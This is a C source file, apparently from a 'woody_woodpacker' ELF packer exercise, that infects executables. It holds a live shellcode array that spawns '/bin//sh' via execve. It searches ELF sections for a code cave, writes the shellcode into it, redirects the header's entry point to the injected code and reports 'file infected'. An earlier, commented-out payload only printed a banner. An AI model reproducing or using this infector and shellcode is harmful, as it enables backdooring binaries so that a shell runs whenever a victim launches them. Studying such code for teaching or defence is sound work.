#include "../inc/woody_woodpacker.h"

// char payload[] = { '\x50','\x57','\x56','\x52','\xb8','\x01','\x00','\x00','\x00','\xbf','\x01','\x00','\x00','\x00','\x48','\xbe','\x00','\x00','\x00','\x00','\x00','\x00','\x00','\xba','\x0f','\x00','\x00','\x00','\x0f','\x05','\x5a','\x5e','\x5f','\x58','\x2e','\x2e','\x2e','\x2e','\x57','\x4f','\x4f','\x44','\x59','\x2e','\x2e','\x2e','\x2e','\x2e','\x0a'};
char payload[] = {"\x48\x31\xf6\x56\x48\xbf"\
		  "\x2f\x62\x69\x6e\x2f"\
		  "\x2f\x73\x68\x57\x54"\
		  "\x5f\xb0\x3b\x99\x0f\x05"};
int is_infected(void)
{
    if (g_elf.hdr.e_shnum == 0)
        return (1);
    return (0);
}

void find_caves(Elf64_Shdr shdr, char c, size_t min)
{
    char *ptr;
    unsigned long max = 0;
    unsigned long i, j;

    if (g_elf.cave_offset)
        return;
    j = 0;
    ptr = g_elf.mem + shdr.sh_offset;
    for (i =0; i < shdr.sh_size; ++i)
    {
        if (ptr[i] == c)
        {
            j = 0;
            while(ptr[i+j] == c)
                j++;
        }
        if (j >= max)
            max = j;
        if (max >= min)
            break;
    }
    if (max >= min)
    {
        printf("max cave in %s found for character %d: %lu bytes\n", get_section_name(shdr.sh_name), c, max);
        g_elf.cave_offset = shdr.sh_offset + i + 6;
    }
    // if (!infected)
    //     ft_memcpy()
}

void write_payload()
{
    Elf64_Addr offset;
    // Elf64_Addr woody;

    offset = g_elf.cave_offset;
    //woody = offset + 38;
    g_elf.woodyfd = open("woody", O_RDWR);
    //ft_memcpy((void*)&payload + WOODY_LEN, &woody, sizeof(woody));
    lseek(g_elf.woodyfd, offset, SEEK_SET);
    write(1, ft_strchr(payload, '.'), WOODY_LEN);
    for (long unsigned int i = 0; i < sizeof(payload); ++i)
        write(g_elf.woodyfd, &payload[i], 1);
    printf("file infected from offset %lu: 0x%08lx\n", offset, offset);
    lseek(g_elf.woodyfd, 0, SEEK_SET);
    printf("entry before:\t0x%08lx\n", g_elf.hdr.e_entry);
    g_elf.hdr.e_entry = offset;
    printf("entry after:\t0x%08lx\n", g_elf.hdr.e_entry);
    write(g_elf.woodyfd, (void*)&g_elf.hdr, sizeof(g_elf.hdr));
    //write(g_elf.woodyfd, &g_elf.hdr.e_entry, sizeof(offset));
    close(g_elf.woodyfd);
}